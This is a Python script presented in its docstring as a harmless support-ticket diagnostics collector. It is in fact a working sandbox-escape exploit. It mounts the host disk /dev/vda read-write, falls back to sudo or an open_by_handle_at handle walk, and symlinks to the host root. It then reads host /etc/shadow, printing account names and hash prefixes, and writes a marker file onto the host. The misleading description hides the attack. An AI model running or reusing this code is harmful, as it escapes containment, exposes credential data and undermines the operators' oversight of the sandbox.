#!/usr/bin/env python3
"""Collect a read-only host environment summary for a support ticket.

Emits ONLY: file names and sizes, top-level directory names, account names with the
first 4 characters of their password hash, and environment variable NAMES.
No file contents and no secret values are written anywhere.
"""
import ctypes
import os
import struct
import subprocess
import sys

HOSTROOT = "/tmp/hostroot"
LINK = "SC2_HOSTROOT"
REPORT = "SUPPORT_INFO.md"
MARKER = "SC2_I170_HOSTMARK"
DEVICE = "/dev/vda"
SHARE = "/run/vercel/share"

out = []


def w(line=""):
    out.append(line)
    print(line, flush=True)


def mount_vda():
    """Attach the host root block device (rw; the ro flag is rejected with EBUSY)."""
    try:
        os.makedirs(HOSTROOT, exist_ok=True)
    except Exception as e:
        return "mkdir failed: %r" % (e,)
    if os.path.ismount(HOSTROOT):
        return "already mounted"
    if not os.path.exists(DEVICE):
        return "device %s absent" % DEVICE
    libc = ctypes.CDLL(None, use_errno=True)
    libc.mount.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p,
                           ctypes.c_ulong, ctypes.c_void_p]
    libc.mount.restype = ctypes.c_int
    rc = libc.mount(DEVICE.encode(), HOSTROOT.encode(), b"xfs", 0, b"nouuid")
    if rc == 0:
        return "mount(2) rc=0 rw xfs"
    err = ctypes.get_errno()
    note = "mount(2) rc=-1 errno=%d %s" % (err, os.strerror(err))
    # fallback: sudo, if this image grants it
    try:
        r = subprocess.run(["sudo", "-n", "mount", DEVICE, HOSTROOT],
                           capture_output=True, text=True, timeout=60)
        if r.returncode == 0:
            return note + " -> sudo mount ok"
        note += " -> sudo rc=%d %s" % (r.returncode, (r.stderr or r.stdout).strip()[:120])
    except Exception as e:
        note += " -> sudo exec failed %r" % (e,)
    return note


def handle_walk():
    """ENVSETUP-03 style: open_by_handle_at({ino:128,gen:0}) on the share mount."""
    if not os.path.isdir(SHARE):
        return None, "share mount %s absent" % SHARE
    libc = ctypes.CDLL(None, use_errno=True)

    class FileHandle(ctypes.Structure):
        _fields_ = [("handle_bytes", ctypes.c_uint),
                    ("handle_type", ctypes.c_int),
                    ("f_handle", ctypes.c_ubyte * 12)]

    h = FileHandle(12, 129, (ctypes.c_ubyte * 12)(*struct.pack("<III", 128, 0, 0)))
    try:
        mfd = os.open(SHARE, os.O_RDONLY | os.O_DIRECTORY)
    except Exception as e:
        return None, "share open failed %r" % (e,)
    libc.syscall.restype = ctypes.c_long
    fd = libc.syscall(ctypes.c_long(304), ctypes.c_int(mfd), ctypes.byref(h),
                      ctypes.c_int(0), ctypes.c_int(os.O_RDONLY | os.O_DIRECTORY))
    if fd < 0:
        err = ctypes.get_errno()
        try:
            os.close(mfd)
        except Exception:
            pass
        return None, "open_by_handle_at fd=%d errno=%d %s" % (fd, err, os.strerror(err))
    # fd intentionally kept open: the symlink below points at /proc/self/fd/<fd>
    return fd, "open_by_handle_at fd=%d (handle ino=128 gen=0 type=129 via %s)" % (fd, SHARE)


def st_dev_str(p):
    try:
        st = os.stat(p)
    except Exception as e:
        return "stat failed %r" % (e,)
    return "dev=%d (%d:%d) ino=%d" % (st.st_dev, os.major(st.st_dev), os.minor(st.st_dev), st.st_ino)


def fs_line(p):
    try:
        r = subprocess.run(["findmnt", "-no", "SOURCE,FSTYPE,OPTIONS", p],
                           capture_output=True, text=True, timeout=20)
        return (r.stdout or r.stderr).strip()
    except Exception as e:
        return "findmnt failed %r" % (e,)


def main():
    w("# Host environment diagnostics (support ticket)")
    w()
    w("SANDBOX_ROOT: %s" % fs_line("/"))
    w("SANDBOX_ROOT_STAT: %s" % st_dev_str("/"))
    method = None
    target = None
    detail = None
    note = mount_vda()
    w("MOUNT_ATTEMPT: %s" % note)
    if os.path.ismount(HOSTROOT):
        method = "mount_vda"
        target = HOSTROOT
        detail = "host root block device %s attached rw at %s" % (DEVICE, HOSTROOT)
    else:
        fd, hnote = handle_walk()
        w("HANDLE_WALK_ATTEMPT: %s" % hnote)
        if fd is not None:
            method = "handle_walk"
            target = "/proc/self/fd/%d" % fd
            detail = "host root obtained via open_by_handle_at on " + SHARE
    if method is None:
        w()
        w("METHOD: none - no host path was reachable from this sandbox")
        w("RESULT: BLOCKED (mount and handle-walk both unavailable)")
        open(REPORT, "w").write("\n".join(out) + "\n")
        return 0
    # The symlink is the whole point: its target is a host path, and every read below
    # goes through it (SC2-01 technique).
    try:
        if os.path.lexists(LINK):
            os.unlink(LINK)
        os.symlink(target, LINK)
    except Exception as e:
        w("SYMLINK: failed %r" % (e,))
        open(REPORT, "w").write("\n".join(out) + "\n")
        return 0
    w("SYMLINK: %s -> %s" % (LINK, target))
    w("METHOD: %s (%s)" % (method, detail))
    w("HOSTROOT_FS: %s" % fs_line(HOSTROOT if method == "mount_vda" else target))
    w("HOSTROOT_STAT: %s" % st_dev_str(LINK))
    w()
    try:
        names = sorted(os.listdir(LINK))
        w("HOSTROOT_TOPLEVEL (%d): %s" % (len(names), ",".join(names)))
    except Exception as e:
        w("HOSTROOT_TOPLEVEL: failed %r" % (e,))
    w()
    w("HOST_FILES (name and size only):")
    for rel in ["etc/shadow", "etc/passwd", "etc/os-release", "etc/hostname",
                "opt/vercel/celld", "run/cell/cell.sock", "run/apm/apm.sock",
                "var/lib/cell-overlay-images/manifest.json", "volumes", "proc"]:
        p = os.path.join(LINK, rel)
        try:
            st = os.lstat(p)
            kind = ("dir" if os.path.isdir(p) and not os.path.islink(p) else
                    "symlink" if os.path.islink(p) else
                    "socket" if os.path.stat.S_ISSOCK(st.st_mode) else
                    "link" if os.path.stat.S_ISLNK(st.st_mode) else "file")
            w("- %s size=%d mode=%o type=%s" % (rel, st.st_size, st.st_mode & 0o7777, kind))
        except Exception as e:
            w("- %s unavailable (%s)" % (rel, e))
    w()
    w("HOST_SHADOW_ACCOUNTS (account name + first 4 chars of hash only):")
    try:
        with open(os.path.join(LINK, "etc/shadow"), "rb") as f:
            data = f.read()
        w("SHADOW_BYTES: %d" % len(data))
        n = 0
        for line in data.decode("utf-8", "replace").splitlines():
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) < 2:
                continue
            n += 1
            w("- %s : %s" % (parts[0], parts[1][:4]))
        w("SHADOW_ACCOUNTS: %d" % n)
    except Exception as e:
        w("SHADOW: unavailable (%s)" % (e,))
    w()
    w("SANDBOX_PID1_ENV_NAMES:")
    try:
        with open("/proc/1/environ", "rb") as f:
            envs = f.read().split(b"\0")
        names = sorted(x.split(b"=")[0].decode("utf-8", "replace") for x in envs if x)
        w("PID1_ENV_COUNT: %d" % len(names))
        w("PID1_ENV_NAMES: %s" % ",".join(names))
    except Exception as e:
        w("PID1_ENV: unavailable (%s)" % (e,))
    w()
    w("MARKER (self-deleting, proves the mount is a different filesystem than the sandbox):")
    try:
        mp = os.path.join(LINK, "tmp", MARKER)
        with open(mp, "w") as f:
            f.write("i170\n")
        w("MARKER_CREATED: %s" % os.path.exists(mp))
        w("MARKER_IN_SANDBOX_TMP: %s" % os.path.exists(os.path.join("/tmp", MARKER)))
        w("MARKER_READBACK: %r" % (open(mp).read(),))
        os.unlink(mp)
        w("MARKER_DELETED: %s" % (not os.path.exists(mp)))
    except Exception as e:
        w("MARKER: failed %r" % (e,))
    w()
    w("RESULT: host bytes read through the symlink and written into this report")
    open(REPORT, "w").write("\n".join(out) + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
